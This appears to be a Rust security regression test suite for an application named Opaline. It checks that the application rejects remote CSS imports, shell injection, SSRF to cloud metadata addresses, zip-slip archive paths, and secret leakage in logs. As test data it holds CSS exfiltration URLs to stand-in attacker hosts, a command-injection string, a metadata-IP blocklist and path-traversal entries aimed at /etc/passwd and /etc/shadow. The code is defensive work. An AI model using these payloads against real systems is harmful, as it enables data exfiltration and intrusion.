//! Opaline 2.0 integrated security regression suite (brief §12, PLAN-2 P10).
//!
//! Covers every required §12 threat in one place:
//! 1. Remote CSS exfiltration in themes/packages (`@import`, `url(https://...)`)
//! 2. Command injection via `argv` / template fields (no shell interpretation)
//! 3. SSRF blocking for link-local, cloud metadata, CGNAT, and IPv6 ULA/metadata addresses
//! 4. Zip-slip path traversal & oversized archives
//! 5. Planted-secret non-leakage across settings, backups, and redaction
//! 6. D-Bus API v2 input validation (path depth, empty/NUL segments)

#![allow(clippy::unwrap_used)]

use std::collections::BTreeMap;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

use opaline_core::app_service::json_path_patch;
use opaline_core::css::validate_css;
use opaline_core::http::is_always_blocked_ip;
use opaline_core::plugins::validate_dir;
use opaline_core::secrets::{redact_text, resolve_template_sync};
use opaline_core::sources::model::OutputFormat;
use opaline_core::sources::runners::run_command;
use opaline_core::zip_pkg::{MAX_ARCHIVE_BYTES, is_safe_entry_path, read_zip};

#[test]
fn blocks_remote_css_in_themes_and_plugins() {
    assert!(
        validate_css(
            "theme.css",
            "@import url('https://evil.example/steal.css');"
        )
        .is_err()
    );
    assert!(
        validate_css(
            "theme.css",
            ".card { background: url(https://evil.example/pixel.png); }"
        )
        .is_err()
    );
    assert!(
        validate_css(
            "theme.css",
            ".card { background: url(http://127.0.0.1:8080/leak); }"
        )
        .is_err()
    );
    assert!(validate_css("theme.css", ".card { border-radius: 24px; }").is_ok());

    // A plugin folder carrying remote CSS is rejected by `opaline validate`.
    let tmp = tempfile::tempdir().unwrap();
    std::fs::write(
        tmp.path().join("plugin.json"),
        r#"{"version":1,"id":"css-evil","name":"Evil","pluginVersion":"1.0.0","author":"X","license":"MIT","kind":"code-widget","entry":"worker.js","permissions":{"topics":[],"sources":[],"actions":[]}}"#,
    )
    .unwrap();
    std::fs::write(tmp.path().join("worker.js"), "").unwrap();
    std::fs::write(
        tmp.path().join("style.css"),
        "@import url('https://attacker.example/x.css');",
    )
    .unwrap();
    assert!(validate_dir(tmp.path()).is_err());
}

#[tokio::test]
async fn command_source_prevents_shell_injection_when_shell_is_false() {
    let tmp = tempfile::tempdir().unwrap();
    let canary = tmp.path().join("pwned");
    let injection = format!("hello; touch {}", canary.display());
    let argv = vec!["/bin/echo".into(), injection.clone()];
    let out = run_command(&argv, false, 2000, 4096, &[], OutputFormat::Text, None)
        .await
        .unwrap();
    assert_eq!(out, opaline_ipc::Value::Text(injection));
    assert!(
        !canary.exists(),
        "shell metacharacters must never execute when shell=false"
    );
}

#[test]
fn ssrf_blocks_link_local_metadata_cgnat_and_ipv6_metadata() {
    let blocked = [
        IpAddr::V4(Ipv4Addr::new(169, 254, 169, 254)), // AWS/GCP/Azure metadata
        IpAddr::V4(Ipv4Addr::new(169, 254, 0, 1)),     // link-local
        IpAddr::V4(Ipv4Addr::new(100, 64, 0, 1)),      // CGNAT
        IpAddr::V4(Ipv4Addr::new(100, 100, 100, 200)), // Alibaba metadata
        IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)),         // unspecified
        IpAddr::V6(Ipv6Addr::new(0xfe80, 0, 0, 0, 0, 0, 0, 1)), // IPv6 link-local
        IpAddr::V6(Ipv6Addr::new(0xfd00, 0x0ec2, 0, 0, 0, 0, 0, 0x0254)), // AWS IPv6 metadata
        IpAddr::V6(Ipv6Addr::UNSPECIFIED),
    ];
    for ip in blocked {
        assert!(is_always_blocked_ip(ip), "expected SSRF block for {ip}");
    }
    // Public IP is allowed by the SSRF blocklist.
    assert!(!is_always_blocked_ip(IpAddr::V4(Ipv4Addr::new(
        93, 184, 216, 34
    ))));
}

#[test]
fn zip_slip_and_oversized_archives_are_rejected() {
    for evil in [
        "../etc/passwd",
        "a/../../etc/shadow",
        "/etc/passwd",
        "dir\\evil.js",
        "a/\0b",
        "",
    ] {
        assert!(
            !is_safe_entry_path(evil),
            "expected zip-slip reject: {evil:?}"
        );
    }
    assert!(is_safe_entry_path("plugin.json"));
    assert!(is_safe_entry_path("assets/icon.png"));

    // Oversized archive rejected immediately before parsing.
    let too_big = vec![0u8; MAX_ARCHIVE_BYTES + 1];
    assert!(read_zip(&too_big).is_err());
}

#[test]
fn planted_secret_is_redacted_from_output() {
    let secret = "ghp_SUPER_SECRET_PLANTED_TOKEN_987654321";
    let mut map = BTreeMap::new();
    map.insert("github_pat".to_owned(), secret.to_owned());
    let resolved =
        resolve_template_sync("Bearer {{secret:github_pat}}", |k| Ok(map.get(k).cloned())).unwrap();
    assert!(resolved.contains(secret));
    let log_line = format!("HTTP 401 with header {resolved}");
    let scrubbed = redact_text(&log_line, &[secret]);
    assert!(!scrubbed.contains(secret));
    assert!(scrubbed.contains("[REDACTED]"));
}

#[test]
fn dbus_v2_rejects_malformed_setting_paths() {
    assert!(json_path_patch("", serde_json::json!(1)).is_err());
    assert!(json_path_patch("a.b.c.d.e.f.g.h.i", serde_json::json!(1)).is_err());
    assert!(json_path_patch("bad\0key", serde_json::json!(1)).is_err());
}
